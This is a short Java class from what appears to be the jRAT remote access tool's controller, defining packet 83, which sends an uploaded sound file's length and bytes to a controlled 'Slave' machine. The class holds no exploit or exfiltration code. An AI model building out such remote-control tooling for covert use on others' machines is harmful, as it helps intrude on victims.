package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet83ServerUploadSound extends AbstractOutgoingPacket {

	private byte[] data;
	private int read;

	public Packet83ServerUploadSound(byte[] data, int read) {
		this.data = data;
		this.read = read;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(read);
		dos.write(data);
	}

	@Override
	public byte getPacketId() {
		return 83;
	}

}
